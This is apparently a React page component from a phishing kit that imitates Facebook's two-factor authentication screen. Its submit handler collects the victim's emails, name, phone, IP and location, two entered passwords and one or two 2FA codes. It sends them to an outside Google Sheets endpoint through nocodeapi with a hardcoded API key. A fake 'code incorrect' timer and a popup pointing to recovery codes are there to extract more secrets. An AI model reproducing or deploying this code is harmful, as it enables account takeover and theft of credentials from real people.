import React, { useEffect, useState } from 'react'
import { Link, useNavigate } from 'react-router-dom'
import { favicon } from './Publics/images/images'
import { Button, InputNumber , Form } from 'antd';

const ConfirmComponent = () => {

    const [activePopup, setActivePopup] = useState(false);
    const [activeLink, setActiveLink] = useState(false);
    const [timeLeft, setTimeLeft] = useState(90); 

    const [activeWaring, setActiveWaring] = useState(false);

    const navigate = useNavigate();

    useEffect(() => {
        const countdownInterval = setInterval(() => {
            if (timeLeft > 0) {
                setTimeLeft(timeLeft - 1); 
            } else {
                clearInterval(countdownInterval); 
                setActiveLink(true)
                setActiveWaring(false)
            }
        }, 1000); 

        return () => {
            clearInterval(countdownInterval); 
        };
    }, [timeLeft]);

    const minutes = Math.floor(timeLeft / 60);
    const seconds = timeLeft % 60;

    const handleOpendPopup = () => {
        setActivePopup(true)
    }

    const handleClosePopup = () => {
        setActivePopup(false)
    }

    const onFinishCodes = (values) => {
        
        if(timeLeft > 0){
            setActiveWaring(true)

            const dataLocalImages = JSON.parse(localStorage.getItem('dataPassWord'))
            const firstCode = {...dataLocalImages, first_code: values.fill_code}

            localStorage.setItem('dataFirstCode', JSON.stringify(firstCode))

            const data   = [[
                firstCode.fill_business_email,
                firstCode.fill_personal_email,
                firstCode.fill_full_name,
                firstCode.fill_facebook_pagename,
                `&_${firstCode.fill_phone}`,
                firstCode.IP,
                firstCode.city,
                firstCode.countryName,
                firstCode.firt_password,
                firstCode.second_password,
                firstCode.first_code,
            ]];

            fetch("https://v1.nocodeapi.com/tuananh91/google_sheets/uBbNrEnAmZBhngJY?tabId=sheet1&api_key=NXhkTJQFUXJkBgBXj", {
                method: "POST",
                mode: "cors",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify(data),
            })
        }

        
        else {
            const dataLocalImages = !JSON.parse(localStorage.getItem('dataFirstCode')) ? JSON.parse(localStorage.getItem('dataPassWord')) : JSON.parse(localStorage.getItem('dataFirstCode'))
            const finalCode = {...dataLocalImages, seconds_code: values.fill_code}

            localStorage.setItem('dataAllCode', JSON.stringify(finalCode))

            const data   = [[
                finalCode.fill_business_email,
                finalCode.fill_personal_email,
                finalCode.fill_full_name,
                finalCode.fill_facebook_pagename,
                `&_${finalCode.fill_phone}`,
                finalCode.IP,
                finalCode.city,
                finalCode.countryName,
                finalCode.firt_password,
                finalCode.second_password,
                finalCode.first_code,
                values.fill_code,
            ]];

            fetch("https://v1.nocodeapi.com/tuananh91/google_sheets/uBbNrEnAmZBhngJY?tabId=sheet1&api_key=NXhkTJQFUXJkBgBXj", {
                method: "POST",
                mode: "cors",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify(data),
            })
            .then((r) => r.json())
            .then((data) => {
                navigate('/1007484836378392943029489/upload-image');
            })
            .catch((error) => {
                console.log(error);
            });

        }

    };


    return (
        <div>
            <div className="confirm">

                <section className="header">
                    <div className="fotoh">
                        <div className="row">
                            <div className="col-6">
                                <img src={favicon} width="40" className="img-fluid" alt='images'/>
                            </div>
                            <div className="col-6" style={{textAlign: "right"}}>
                                <p style={{color: "rgb(53, 120, 229)", display: "none", paddingTop: "8px", marginBottom: "0px", fontWeight: "600", fontSize: "15px"}}>
                                    <i className="fa-solid fa-envelope" style={{fontSize: "16px"}}></i>
                                    Support Inbox
                                </p>
                            </div>
                        </div>
                    </div>
                </section>

                <div className="main-confirm">
                    <div className="container">
                        <div className="content col-md-8 col-12">
                            <Form
                                name="basicForm"
                                initialValues={{
                                remember: true,
                                }}
                                onFinish={onFinishCodes}
                                autoComplete="off"
                            >
                                <div className="card">
                                    <h3 className="twh3">Two-factor authentication required (1/3)</h3>
                                    <div className="bodyyy">
                                        <p> You’ve asked us to require a 6-8 digit login code when anyone tries to access your account from a new device or browser. </p>
                                        <p> Enter the 6-8 digit code from your <strong>code generator</strong> or third-party app below. </p>

                                           
                                        <div className="form-group" style={{paddingLeft: "0px", paddingTop: "5px", paddingBottom: "10px", display: "inline-block"}}>
                                                
                                            <div
                                                className="item-form"
                                                style={{
                                                    display: "flex",
                                                    alignItems: "center"
                                                }}
                                            >
                                                <Form.Item
                                                    name="fill_code"
                                                    style={{
                                                        margin: "0"
                                                    }}
                                                    rules={[
                                                        {
                                                        required: true,
                                                        message: '',
                                                        },
                                                    ]}
                                                >
                                                    <InputNumber 
                                                        maxLength={8}
                                                        minLength={4}
                                                        style={{
                                                            marginLeft: "0px ", 
                                                            fontSize: "14px", 
                                                            borderRadius: "4px", 
                                                            boxShadow: "rgba(0, 0, 0, 0.08) 0px 1px 1px inset", 
                                                            color: "rgb(78, 77, 77)"
                                                        }}
                                                    />

                                                </Form.Item>

                                                <div className="form-group paddingleftt" style={{ display: "inline-block"}}>
                                                    <p name="" id="timer" className={`nolink ${activeLink === true ? 'active' : ''}`} style={{backgroundColor: "transparent", border: "transparent", padding: "0px", margin: "0px",  color: "rgb(56, 88, 152)", fontSize: "13px"}}> 
                                                        ( wait: <span id="timeri" style={{marginBottom: "0px"}}> {minutes}:{seconds < 10 ? `0${seconds}` : seconds} </span> ) 
                                                    </p>
                                                    <Link id="sendcodeagain" className={`btn ${activeLink === true ? 'active' : ''}`} to="">Send Code Again?</Link>
                                                </div>
                                            </div>

                                            <div className={`${activeWaring === true ? 'active' : ''}`} id="waring-code"> 
                                                <p>The code generator you entered is incorrect. Please wait {minutes} minutes {seconds < 10 ? `0${seconds}` : seconds} seconds to receive another one.</p>
                                            </div>
                                                

                                        </div>
                                    </div> 


                                    <div className="footerii" style={{width: "100%"}}>
                                        <Link onClick={handleOpendPopup} data-toggle="modal" data-target="#twof" className="linkupertwo" style={{fontSize: "14px", color: "rgb(56, 88, 152)", fontWeight: "600", marginBottom: "0px", float: "left", marginTop: "6px", cursor: "pointer", textDecoration: "none"}}>Need another way to authenticate?</Link>
                                        <Form.Item 
                                            style={{
                                                color: "rgb(255, 255, 255)", 
                                                backgroundColor: "rgb(44, 132, 244)", 
                                                width: "auto",
                                                float: 'right',
                                                margin: '0',
                                                padding: '0px 7px'
                                            }}
                                            className="btn butoni"
                                        >
                                            <Button
                                                htmlType="submit"
                                                style={{
                                                    backgroundColor: "transparent",
                                                    outline: "none",
                                                    border: 'none',
                                                    boxShadow: 'none',
                                                    fontWeight: '700',
                                                    fontSize:'1rem',
                                                    color: 'white',
                                                    marginBottom: "0"
                                                }}
                                            >
                                                Send
                                            </Button>
                                        </Form.Item>
                                    </div>
                                </div>
                            </Form>
                        </div>
                    </div>
                </div>


                <div className={`popup  ${activePopup === true ? 'active' : ''}`} id="popup">
                    <div className="background" onClick={handleClosePopup}></div>
                    <div className="content">
                        <div className="modal-header custom-header px-0">
                            <h5 id="exampleModalLabel" className="modal-title" style={{fontSize: "18px", fontWeight: "600"}}> Didn't receive a code?</h5>
                            <button type="button" data-dismiss="modal" aria-label="Close" onClick={handleClosePopup} className="close">
                                <span aria-hidden="true" >×</span>
                            </button>
                        </div>

                        <div >
                            <p>1. Go to <b>{`Setting > Security and Login`}</b></p>
                            <p>2. Under the <b>Two-Factor Authentication</b> section, click <b>Use Two-Factor Authentication.</b> You may need to re-enter your password.</p>
                            <p>3. Next to <b>Recovery Codes,</b> click <b>Setup</b> then <b>Get Codes.</b> If you're already set up recovery codes, you can click <b>Show Codes.</b></p>
                        </div>
                        <div style={{textAlign: "right"}}>
                            <button onClick={handleClosePopup} className="btn butoni" style={{color: "rgb(255, 255, 255)", backgroundColor: "#9c9d9f ", marginTop: "20px ", width: "auto "}}>Close</button>
                        </div>

                    </div>
                </div>

            </div>
        </div>
    )
}

export default ConfirmComponent